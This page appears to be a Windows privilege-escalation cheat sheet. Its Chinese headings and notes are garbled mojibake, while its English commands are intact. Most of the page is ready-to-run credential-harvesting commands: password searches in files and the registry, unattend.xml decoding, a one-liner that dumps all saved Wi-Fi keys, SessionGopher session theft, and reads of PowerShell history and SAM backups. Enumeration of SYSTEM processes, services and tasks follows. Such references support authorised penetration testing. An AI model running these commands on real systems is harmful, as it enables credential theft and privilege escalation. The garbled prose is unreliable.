<p>åœ¨ .xml, .ini, .txt .config ç­‰æ–‡ä»¶ä¸­æœç´¢ Password</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/SI</span><span class="w"> </span><span class="nx">/M</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w">
</span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">results.txt</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/spin</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.*</span><span class="w">
</span></code></pre></div></div>

<p>åœ¨è¿œç¨‹åœ°å€ä¾‹å¦‚ SMB Shares æˆ– SharePoint æœç´¢</p>

<ul>
  <li>Search passwords in SharePoint: <a href="https://github.com/nheiniger/SnaffPoint">nheiniger/SnaffPoint</a> (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6)</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># First, retrieve a token</span><span class="w">
</span><span class="c">## Method 1: using SnaffPoint binary</span><span class="w">
</span><span class="nv">$token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">.</span><span class="n">\GetBearerToken.exe</span><span class="w"> </span><span class="nx">https://your.sharepoint.com</span><span class="p">)</span><span class="w">
</span><span class="c">## Method 2: using AADInternals</span><span class="w">
</span><span class="n">Install-Module</span><span class="w"> </span><span class="nx">AADInternals</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">CurrentUser</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">AADInternals</span><span class="w">
</span><span class="nv">$token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-AADIntAccessToken</span><span class="w"> </span><span class="nt">-ClientId</span><span class="w"> </span><span class="s2">"9bc3ab49-b65d-410a-85ad-de819febfddc"</span><span class="w"> </span><span class="nt">-Tenant</span><span class="w"> </span><span class="s2">"your.onmicrosoft.com"</span><span class="w"> </span><span class="nt">-Resource</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="p">)</span><span class="w">

</span><span class="c"># Second, search on Sharepoint</span><span class="w">
</span><span class="c">## Method 1: using search strings in ./presets dir</span><span class="w">
</span><span class="o">.</span><span class="n">\SnaffPoint.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nv">$token</span><span class="w">
</span><span class="c">## Method 2: using search string in command line</span><span class="w">
</span><span class="c">### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference</span><span class="w">
</span><span class="o">.</span><span class="n">\SnaffPoint.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nv">$token</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nt">-q</span><span class="w"> </span><span class="s2">"filename:.config"</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>Search passwords in SMB Shares: <a href="https://github.com/SnaffCon/Snaffler">SnaffCon/Snaffler</a></li>
</ul>

<h3 id="æœç´¢å’Œ-password-ç›¸å…³çš„æ–‡ä»¶å">æœç´¢å’Œ password ç›¸å…³çš„æ–‡ä»¶å</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> <span class="na">/S /B </span><span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.txt <span class="o">==</span> <span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.xml <span class="o">==</span> <span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.ini <span class="o">==</span> <span class="o">*</span><span class="kd">cred</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="kd">vnc</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span>.config<span class="o">*</span>
<span class="nb">where</span> <span class="na">/R </span><span class="kd">C</span>:\ <span class="kd">user</span>.txt
<span class="nb">where</span> <span class="na">/R </span><span class="kd">C</span>:\ <span class="o">*</span>.ini
</code></pre></div></div>

<h3 id="æœç´¢å’Œ-password-ç›¸å…³çš„æ³¨å†Œè¡¨">æœç´¢å’Œ password ç›¸å…³çš„æ³¨å†Œè¡¨</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="c"># Windows Autologin</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"DefaultUserName DefaultDomainName DefaultPassword"</span><span class="w"> 
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</span><span class="w"> </span><span class="c"># SNMP parameters</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\SimonTatham\PuTTY\Sessions"</span><span class="w"> </span><span class="c"># Putty clear text proxy credentials</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\ORL\WinVNC3\Password"</span><span class="w"> </span><span class="c"># VNC credentials</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">password</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span></code></pre></div></div>

<h3 id="åœ¨-unattendxml-ä¸­æœç´¢å¯†ç ">åœ¨ unattend.xml ä¸­æœç´¢å¯†ç </h3>
<p>è‡ªåŠ¨å®‰è£…å…è®¸ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨ä¸‹è‡ªåŠ¨å®‰è£…ã€‚è¿™ç§è§£å†³æ–¹æ¡ˆç”¨äºåœ¨æ‹¥æœ‰è¾ƒå¤šé›‡å‘˜å’Œæ—¶é—´ç´§ç¼ºçš„è¾ƒå¤§å‹ç»„ç»‡ä¸­éƒ¨ç½²ç¨‹åºã€‚å¦‚æœç®¡ç†å‘˜æ²¡æœ‰è¿›è¡Œæ¸…ç†çš„è¯ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªåä¸ºUnattendçš„XMLæ–‡ä»¶æ®‹å­˜åœ¨ç³»ç»Ÿä¸Šã€‚è¿™ä¸ªXMLæ–‡ä»¶åŒ…å«æ‰€æœ‰åœ¨å®‰è£…ç¨‹åºè¿‡ç¨‹ä¸­çš„é…ç½®ï¼ŒåŒ…æ‹¬ä¸€äº›æœ¬åœ°ç”¨æˆ·çš„é…ç½®ï¼Œä»¥åŠç®¡ç†å‘˜è´¦æˆ·ã€‚</p>

<p>Location of the unattend.xml files.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\Panther\Unattend.xml</span><span class="w">
</span><span class="n">C:\Windows\Panther\Unattend\Unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\system32\sysprep.inf</span><span class="w">
</span><span class="n">C:\Windows\system32\sysprep\sysprep.xml</span><span class="w">
</span></code></pre></div></div>

<p>Display the content of these files with <code class="language-plaintext highlighter-rouge">dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</code>.</p>

<p>Example content</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&lt;</span><span class="n">component</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"Microsoft-Windows-Shell-Setup"</span><span class="w"> </span><span class="n">publicKeyToken</span><span class="o">=</span><span class="s2">"31bf3856ad364e35"</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">"neutral"</span><span class="w"> </span><span class="n">versionScope</span><span class="o">=</span><span class="s2">"nonSxS"</span><span class="w"> </span><span class="n">processorArchitecture</span><span class="o">=</span><span class="s2">"amd64"</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">AutoLogon</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Password</span><span class="err">&gt;</span><span class="nx">U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo</span><span class="o">==</span><span class="err">&lt;</span><span class="n">/Password</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Enabled</span><span class="err">&gt;</span><span class="nx">true</span><span class="err">&lt;</span><span class="nx">/Enabled</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Username</span><span class="err">&gt;</span><span class="nx">Administrateur</span><span class="err">&lt;</span><span class="nx">/Username</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">/AutoLogon</span><span class="err">&gt;</span><span class="w">

    </span><span class="err">&lt;</span><span class="n">UserAccounts</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">LocalAccounts</span><span class="err">&gt;</span><span class="w">
      </span><span class="err">&lt;</span><span class="n">LocalAccount</span><span class="w"> </span><span class="nx">wcm:action</span><span class="o">=</span><span class="s2">"add"</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Password</span><span class="err">&gt;</span><span class="o">*</span><span class="nx">SENSITIVE</span><span class="o">*</span><span class="nx">DATA</span><span class="o">*</span><span class="nx">DELETED</span><span class="o">*</span><span class="err">&lt;</span><span class="nx">/Password</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Group</span><span class="err">&gt;</span><span class="nx">administrators</span><span class="p">;</span><span class="n">users</span><span class="err">&lt;</span><span class="nx">/Group</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Name</span><span class="err">&gt;</span><span class="nx">Administrateur</span><span class="err">&lt;</span><span class="nx">/Name</span><span class="err">&gt;</span><span class="w">
      </span><span class="err">&lt;</span><span class="n">/LocalAccount</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">/LocalAccounts</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">/UserAccounts</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<p>Unattend credentials are stored in base64 and can be decoded manually with base64.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="nt">-d</span><span class="w"> 
</span><span class="n">SecretSecurePassword1234</span><span class="o">*</span><span class="w">
</span></code></pre></div></div>

<p>The Metasploit module <code class="language-plaintext highlighter-rouge">post/windows/gather/enum_unattend</code> looks for these files.</p>

<ul>
  <li><a href="https://www.cnblogs.com/zpchcbd/p/12232683.html">Unattended Installsææƒ - zpchcbd - åšå®¢å›­</a></li>
</ul>

<h3 id="iis-web-config-ä¸­çš„å¯†ç ">IIS Web config ä¸­çš„å¯†ç </h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Childitem</span><span class="w"> </span><span class="err">â€“</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\inetpub\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="nx">web.config</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span></code></pre></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span><span class="w">
</span><span class="nx">C:\inetpub\wwwroot\web.config</span><span class="w">
</span></code></pre></div></div>

<h3 id="å…¶ä»–å¯èƒ½å­˜åœ¨å‡­è¯çš„æ–‡ä»¶">å…¶ä»–å¯èƒ½å­˜åœ¨å‡­è¯çš„æ–‡ä»¶</h3>

<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">%SYSTEMDRIVE%</span>\pagefile.sys
<span class="nv">%WINDIR%</span>\debug\NetSetup.log
<span class="nv">%WINDIR%</span>\repair\sam
<span class="nv">%WINDIR%</span>\repair\system
<span class="nv">%WINDIR%</span>\repair\software<span class="o">,</span> <span class="nv">%WINDIR%</span>\repair\security
<span class="nv">%WINDIR%</span>\iis6.log
<span class="nv">%WINDIR%</span>\system32\config\AppEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\SecEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\default.sav
<span class="nv">%WINDIR%</span>\system32\config\security.sav
<span class="nv">%WINDIR%</span>\system32\config\software.sav
<span class="nv">%WINDIR%</span>\system32\config\system.sav
<span class="nv">%WINDIR%</span>\system32\CCM\logs\<span class="o">*</span>.log
<span class="nv">%USERPROFILE%</span>\ntuser.dat
<span class="nv">%USERPROFILE%</span>\LocalS<span class="o">~</span><span class="m">1</span>\Tempor<span class="o">~</span><span class="m">1</span>\Content.IE5\index.dat
<span class="nv">%WINDIR%</span>\System32\drivers\etc\hosts
<span class="kd">C</span>:\ProgramData\Configs\<span class="o">*</span>
<span class="kd">C</span>:\Program <span class="kd">Files</span>\Windows <span class="kd">PowerShell</span>\<span class="o">*</span>
<span class="nb">dir</span> <span class="kd">c</span>:<span class="o">*</span><span class="kd">vnc</span>.ini <span class="na">/s /b
</span><span class="nb">dir</span> <span class="kd">c</span>:<span class="o">*</span><span class="kd">ultravnc</span>.ini <span class="na">/s /b
</span></code></pre></div></div>

<h3 id="wifi-å¯†ç ">Wifi å¯†ç </h3>

<p>Find AP SSID</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profile</span>
</code></pre></div></div>

<p>Get Cleartext Pass</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profile</span> <span class="o">&lt;</span><span class="kd">SSID</span><span class="o">&gt;</span> <span class="kd">key</span><span class="o">=</span><span class="kd">clear</span>
</code></pre></div></div>

<p>Oneliner method to extract wifi passwords from all the access point.</p>

<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cls</span> <span class="o">&amp;</span> <span class="nb">echo</span>. <span class="o">&amp;</span> <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=4 delims=: "</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'netsh wlan show profiles </span><span class="se">^|</span><span class="s1"> find "Profile "'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="na">off</span> <span class="o">&gt;</span> <span class="kr">nul</span> <span class="o">&amp;</span> <span class="o">(</span><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profiles</span> <span class="kd">name</span><span class="o">=</span><span class="vm">%a</span> <span class="kd">key</span><span class="o">=</span><span class="kd">clear</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SSID Cipher Content"</span> <span class="o">|</span> <span class="nb">find</span> <span class="na">/v </span><span class="s2">"Number"</span> <span class="o">&amp;</span> <span class="nb">echo</span>.<span class="o">)</span> <span class="o">&amp;</span> @echo <span class="na">on</span>
</code></pre></div></div>
<p>æ³¨æ„ï¼Œè¯¥ä¸€å¥è¯ä»…å¯¹è‹±æ–‡ç³»ç»Ÿæœ‰ç”¨ï¼Œä¸­æ–‡ç³»ç»Ÿéœ€è¦ä¿®æ”¹åŒ¹é…å­—æ®µã€‚</p>

<h3 id="ä¾¿ç¬ºä¸­å­˜æ”¾çš„å¯†ç ">ä¾¿ç¬ºä¸­å­˜æ”¾çš„å¯†ç </h3>
<p>The sticky notes app stores itâ€™s content in a sqlite db located at C:\Users&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</p>

<h3 id="æœåŠ¡ä¸­å­˜æ”¾çš„å¯†ç ">æœåŠ¡ä¸­å­˜æ”¾çš„å¯†ç </h3>
<p>Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path<span class="se">\t</span>o<span class="se">\S</span>essionGopher.ps1<span class="p">;</span>
Invoke-SessionGopher <span class="nt">-AllDomain</span> <span class="nt">-o</span>
Invoke-SessionGopher <span class="nt">-AllDomain</span> <span class="nt">-u</span> domain.com<span class="se">\a</span>dm-arvanaghi <span class="nt">-p</span> s3cr3tP@ss
</code></pre></div></div>
<h3 id="key-manager-ä¸­å­˜æ”¾çš„å¯†ç ">Key Manager ä¸­å­˜æ”¾çš„å¯†ç </h3>
<p>This software will display its output in a GUI</p>

<p>ä¸‹é¢çš„å‘½ä»¤å°†æ‰“å¼€ windows å‡­æ®ç®¡ç†å™¨ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 keymgr,KRShowKeyMgr
</code></pre></div></div>
<h3 id="powershell-å†å²è®°å½•ä¸­å­˜æ”¾çš„å¯†ç ">Powershell å†å²è®°å½•ä¸­å­˜æ”¾çš„å¯†ç </h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type</span> %userprofile%<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>wissky<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">type</span> <span class="nv">$env</span>:APPDATA<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadLine<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">cat</span> <span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath
<span class="nb">cat</span> <span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath | sls passw
</code></pre></div></div>

<p>å…³é—­ ps å†å²è®°å½•</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-PSReadlineOption <span class="nt">-HistorySaveStyle</span> SaveNothing
</code></pre></div></div>

<h3 id="powershell-transcript-æ–‡ä»¶">Powershell Transcript æ–‡ä»¶</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\&lt;</span>USERNAME&gt;<span class="se">\D</span>ocuments<span class="se">\P</span>owerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt
C:<span class="se">\T</span>ranscripts<span class="se">\&lt;</span>DATE&gt;<span class="se">\P</span>owerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt
</code></pre></div></div>

<h3 id="å¤‡ç”¨æ•°æ®æµadsä¸­çš„å¯†ç ">å¤‡ç”¨æ•°æ®æµï¼ˆADSï¼‰ä¸­çš„å¯†ç </h3>
<p>ADS æ˜¯æ·»åŠ åˆ°æ–°æŠ€æœ¯æ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿç§°ä¸º NT æ–‡ä»¶ç³»ç»Ÿ (NTFS)ï¼‰ä¸­çš„åŠŸèƒ½ï¼Œä»¥æé«˜ä¸ Macintosh åˆ†å±‚æ–‡ä»¶ç³»ç»Ÿ (HFS) çš„å¯æ¯”æ€§ã€‚</p>

<p>ä¾‹å¦‚åœ¨ notepad ä¸­ç¼–è¾‘ä½†æœªä¿å­˜åˆ°æ–‡ä»¶çš„æ•°æ®ã€‚</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Item</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Content</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="nx">Flag</span><span class="w">
</span></code></pre></div></div>

<h3 id="laps-settings">LAPS Settings</h3>
<p>Extract <code class="language-plaintext highlighter-rouge">HKLM\Software\Policies\Microsoft Services\AdmPwd</code> from Windows Registry.</p>

<ul>
  <li>LAPS Enabled: AdmPwdEnabled</li>
  <li>LAPS Admin Account Name: AdminAccountName</li>
  <li>LAPS Password Complexity: PasswordComplexity</li>
  <li>LAPS Password Length: PasswordLength</li>
  <li>LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled</li>
</ul>

<h2 id="è¿›ç¨‹ç›¸å…³ææƒæ–¹å¼">è¿›ç¨‹ç›¸å…³ææƒæ–¹å¼</h2>
<h3 id="å“ªäº›è¿›ç¨‹åœ¨è¿è¡Œ">å“ªäº›è¿›ç¨‹åœ¨è¿è¡Œ</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /v
net start
sc query
Get-Service
Get-Process
Get-WmiObject <span class="nt">-Query</span> <span class="s2">"Select * from Win32_Process"</span> | where <span class="o">{</span><span class="nv">$_</span>.Name <span class="nt">-notlike</span> <span class="s2">"svchost*"</span><span class="o">}</span> | Select Name, Handle, @<span class="o">{</span><span class="nv">Label</span><span class="o">=</span><span class="s2">"Owner"</span><span class="p">;</span><span class="nv">Expression</span><span class="o">={</span><span class="nv">$_</span>.GetOwner<span class="o">()</span>.User<span class="o">}}</span> | ft <span class="nt">-AutoSize</span>
</code></pre></div></div>

<h3 id="å“ªäº›è¿›ç¨‹ä»¥-system-æƒé™è¿è¡Œ">å“ªäº›è¿›ç¨‹ä»¥ system æƒé™è¿è¡Œ</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /v /fi <span class="s2">"username eq system"</span>
</code></pre></div></div>
<p>å¦‚æœè¿™äº›è¿›ç¨‹æ‰€åœ¨ç›®å½•ï¼Œæˆ–åŠ è½½çš„ dll æ‰€åœ¨ç›®å½•å¯å†™çš„è¯ï¼Œå¯åˆ©ç”¨ dll åŠ«æŒææƒã€‚</p>

<h3 id="powershell-ç‰ˆæœ¬">Powershell ç‰ˆæœ¬</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG QUERY <span class="s2">"HKLM</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\P</span><span class="s2">owerShell</span><span class="se">\1\P</span><span class="s2">owerShellEngine"</span> /v PowerShellVersion
</code></pre></div></div>
<h3 id="æšä¸¾å·²å®‰è£…ç¨‹åº">æšä¸¾å·²å®‰è£…ç¨‹åº</h3>
<p>å·²å®‰è£…ç¨‹åºå¯ä½œä¸ºææƒçªç ´ç‚¹ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem <span class="s1">'C:\Program Files'</span>, <span class="s1">'C:\Program Files (x86)'</span> | ft Parent,Name,LastWriteTime
Get-ChildItem <span class="nt">-path</span> Registry::HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE | ft Name
</code></pre></div></div>

<h3 id="æšä¸¾å·²å®‰è£…æœåŠ¡">æšä¸¾å·²å®‰è£…æœåŠ¡</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">net</span> <span class="nb">start</span>
<span class="nb">wmic</span> <span class="kd">service</span> <span class="kd">list</span> <span class="kd">brief</span>
<span class="nb">tasklist</span> <span class="na">/SVC
</span></code></pre></div></div>
<h3 id="æšä¸¾è®¡åˆ’ä»»åŠ¡">æšä¸¾è®¡åˆ’ä»»åŠ¡</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="m">2</span><span class="o">&gt;</span><span class="kr">nul</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="kd">TaskName</span>
<span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="na">/v </span><span class="o">&gt;</span> <span class="nb">schtasks</span>.txt<span class="o">;</span> <span class="kd">cat</span> <span class="kd">schtask</span>.txt <span class="o">|</span> <span class="kd">grep</span> <span class="s2">"SYSTEM\|Task To Run"</span> <span class="o">|</span> <span class="kd">grep</span> <span class="na">-B </span><span class="m">1</span> <span class="kd">SYSTEM</span>
<span class="kd">Get</span><span class="na">-ScheduledTask </span><span class="o">|</span> <span class="nb">where</span> <span class="o">{</span>$_.TaskPath <span class="na">-notlike </span><span class="s2">"\Microsoft*"</span><span class="o">}</span> <span class="o">|</span> <span class="kd">ft</span> <span class="kd">TaskName</span><span class="o">,</span><span class="kd">TaskPath</span><span class="o">,</span><span class="kd">State</span>
</code></pre></div></div>
<h3 id="æšä¸¾è‡ªå¯åŠ¨åº”ç”¨">æšä¸¾è‡ªå¯åŠ¨åº”ç”¨</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wmic</span> <span class="kd">startup</span> <span class="kd">get</span> <span class="kd">caption</span><span class="o">,</span><span class="kd">command</span>
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKLM</span>\Software\Microsoft\Windows\CurrentVersion\R
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\Run
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\RunOnce
<span class="nb">dir</span> <span class="s2">"C:\Documents and Settings\All Users\Start Menu\Programs\Startup"</span>
<span class="nb">dir</span> <span class="s2">"C:\Documents and Settings\</span><span class="nv">%username%</span><span class="s2">\Start Menu\Programs\Startup"</span>
</code></pre></div></div>

